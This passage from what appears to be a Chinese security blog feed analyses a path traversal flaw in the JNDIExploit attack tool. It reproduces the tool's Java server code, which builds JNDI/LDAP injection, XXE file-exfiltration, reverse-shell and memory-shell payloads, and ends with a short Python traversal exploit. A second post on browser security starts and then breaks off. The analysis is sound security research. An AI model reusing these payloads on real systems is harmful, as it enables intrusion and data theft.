class="line"></span><br><span class="line">        <span class="keyword">if</span>(groovyName.equalsIgnoreCase(<span class="string">&quot;groovyecho&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;class demo &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    static void main()&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        com.sun.rowset.JdbcRowSetImpl o = new com.sun.rowset.JdbcRowSetImpl();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389&quot;</span> + exp + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setAutoCommit(true);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + groovyName + <span class="string">&quot;.groovy&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXXELogRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exchangeImpl</span> <span class="operator">=</span> FieldUtils.readField(exchange, <span class="string">&quot;impl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> FieldUtils.readField(exchangeImpl, <span class="string">&quot;req&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">startLine</span> <span class="operator">=</span> (String) FieldUtils.readField(request, <span class="string">&quot;startLine&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] XXE Attack Result: &quot;</span> + startLine);</span><br><span class="line">        exchange.sendResponseHeaders(<span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleJarRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jarName.equalsIgnoreCase(<span class="string">&quot;behinder3&quot;</span>))&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + <span class="string">&quot;behinder3.jar&quot;</span>;</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            bytes = fileReader.readBytes();</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + jarName + <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">                <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                bytes = fileReader.readBytes();</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleClassRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Receive ClassRequest: &quot;</span> + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先从Cache中加载</span></span><br><span class="line">        <span class="keyword">if</span>(Cache.contains(className))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = Cache.get(className);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            <span class="comment">//这一步返回http请求</span></span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//找不到就从/data目录下照</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleWSDLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> exchange.getRequestURI().getQuery();</span><br><span class="line">        Map&lt;String, String&gt; params = parseQuery(query);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath().substring(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;list&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">//intended to list directories or read files on server</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> params.get(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; !file.isEmpty()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">listWsdl</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;!DOCTYPE x [\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % aaa SYSTEM \&quot;file:///&quot;</span> + file + <span class="string">&quot;\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % bbb SYSTEM \&quot;http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/http.wsdl\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  %bbb;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;]&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;definitions name=\&quot;HelloService\&quot; xmlns=\&quot;http://schemas.xmlsoap.org/wsdl/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &amp;ddd;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/definitions&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, listWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(listWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;upload&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> params.get(<span class="string">&quot;type&quot;</span>);</span><br><span class="line"></span><br><span class="line">            String[] args = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;dnslog&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;url&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;ip&quot;</span>), params.get(<span class="string">&quot;port&quot;</span>)&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> createJar(type, args);</span><br><span class="line">            <span class="keyword">if</span> (jarName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">uploadWsdl</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE a SYSTEM \&quot;jar:http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort +</span><br><span class="line">                        <span class="string">&quot;/&quot;</span> + jarName + <span class="string">&quot;.jar!/file.txt\&quot;&gt;&lt;a&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, uploadWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(uploadWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;http&quot;</span>))  &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xxhttp</span> <span class="operator">=</span> <span class="string">&quot;&lt;!ENTITY % ccc &#x27;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=\&quot;uri\&quot; location=\&quot;http://&quot;</span> +</span><br><span class="line">                    Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/xxelog?%aaa;\&quot;/&gt;&amp;#39;&gt;&#x27;&gt;%ccc;&quot;</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xxhttp.getBytes().length);</span><br><span class="line">            exchange.getResponseBody().write(xxhttp.getBytes());</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title function_">parseQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        Map&lt;String,String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(String str : query.split(<span class="string">&quot;&amp;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    String[] parts = str.split(<span class="string">&quot;=&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    params.put(parts[<span class="number">0</span>], parts[<span class="number">1</span>]);</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                    <span class="comment">//continue</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">//continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         由于我本地安装的 Websphere 在加载本地 classpath 这一步复现不成功</span></span><br><span class="line"><span class="comment">         这里不确定 websphere 这种方式在多次操作时 Class 文件名相同时是否会存在问题</span></span><br><span class="line"><span class="comment">         目前暂时认为其不会有问题，如果有问题，后面再修改</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">createJar</span><span class="params">(String type, String... params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;xExportObject&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">CommandTemplate</span> <span class="variable">commandTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommandTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = commandTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;dnslog&quot;</span>))&#123;</span><br><span class="line">            <span class="type">DnslogTemplate</span> <span class="variable">dnslogTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DnslogTemplate</span>(params[<span class="number">0</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = dnslogTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ReverseShellTemplate</span> <span class="variable">reverseShellTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReverseShellTemplate</span>(params[<span class="number">0</span>], params[<span class="number">1</span>], <span class="string">&quot;xExportObject&quot;</span>);</span><br><span class="line">            bytes = reverseShellTemplate.getBytes();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.toLowerCase().equals(<span class="string">&quot;webspherememshell&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">exploitClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.feihong.ldap.template.WebsphereMemshellTemplate&quot;</span>);</span><br><span class="line">            exploitClass.setName(className);</span><br><span class="line">            exploitClass.detach();</span><br><span class="line">            bytes = exploitClass.toBytecode();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Name of Class in Jar: &quot;</span> + className);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">JarOutputStream</span> <span class="variable">jarOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(bout);</span><br><span class="line">        jarOut.putNextEntry(<span class="keyword">new</span> <span class="title class_">ZipEntry</span>(className + <span class="string">&quot;.class&quot;</span>));</span><br><span class="line">        jarOut.write(bytes);</span><br><span class="line">        jarOut.closeEntry();</span><br><span class="line">        jarOut.close();</span><br><span class="line">        bout.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> Util.getRandomString();</span><br><span class="line">        Cache.set(jarName, bout.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jarName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>当后缀名不属于if else中的任意一种的时候会进入<code>handleFileRequest</code>中。<br>看看内部处理<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">       <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">       <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">       <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">           <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">           fileInputStream.read(bytes);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">           exchange.getResponseBody().write(bytes);</span><br><span class="line">       &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">           exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       exchange.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>他会获取最后一个<code>/</code>并与当前pwd拼接，但是在Windows系统中，路径是用<code>\</code>进行表示的，所以在windows上运行该工具会造成相应的任意文件读取。<br>这里我用python进行攻击<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/4.png" alt><br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/3.png" alt><br>可以看到返回了文件内容。而我d盘下也确实有该文件<br><img src="/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/5.png" alt><br>当然不止<code>handleFileRequest</code>有这个问题，其他的函数都是这么处理的，所以都会导致该漏洞的产生。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filename = <span class="string">&#x27;..\\..\\..\\..\\..\\flag&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:3456/&quot;</span></span><br><span class="line">r = requests.get(url+filename)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;路径穿越漏洞&quot;&gt;&lt;a href=&quot;#路径穿越漏洞&quot; class=&quot;headerlink&quot; title=&quot;路径穿越漏洞&quot;&gt;&lt;/a&gt;路径穿越漏洞&lt;/h2&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>前端安全1-浏览器安全模型（笔记）</title>
    <link href="http://example.com/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-12T02:02:09.000Z</published>
    <updated>2023-09-20T09:22:15.331Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。<br><span id="more"></span></p><ul><li><a href="https://ithelp.ithome.com.tw/users/20091346/ironman/6155">https://ithelp.ithome.com.tw/users/20091346/ironman/6155</a></li><li><a href="https://blog.huli.tw/">https://blog.huli.tw/</a></li></ul><p>因为是笔记，所以本文都是对于huli大佬的文章的总结和拓展，所以就把参考文章直接放到下面了</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://ithelp.ithome.com.tw/articles/10314125">https://ithelp.ithome.com.tw/articles/10314125</a></li></ul><h2 id="前端运行环境"><a href="#前端运行环境" class="headerlink" title="前端运行环境"></a>前端运行环境</h2><p><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>先看到上图，前端是运行在浏览器之中的，而浏览器会给前端一大堆的限制</p><h3 id="禁止主动文件读取"><a href="#禁止主动文件读取" class="headerlink" title="禁止主动文件读取"></a>禁止主动文件读取</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> onchange=<span class="string">&quot;show(this)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">input</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="property">onload</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">alert</span>(event.<span class="property">target</span>.<span class="property">result</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  reader.<span class="title function_">readAsText</span>(input.<span class="property">files</span>[<span class="number">0</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span></span></span><br><span class="line"><span class="language-javascript"><span 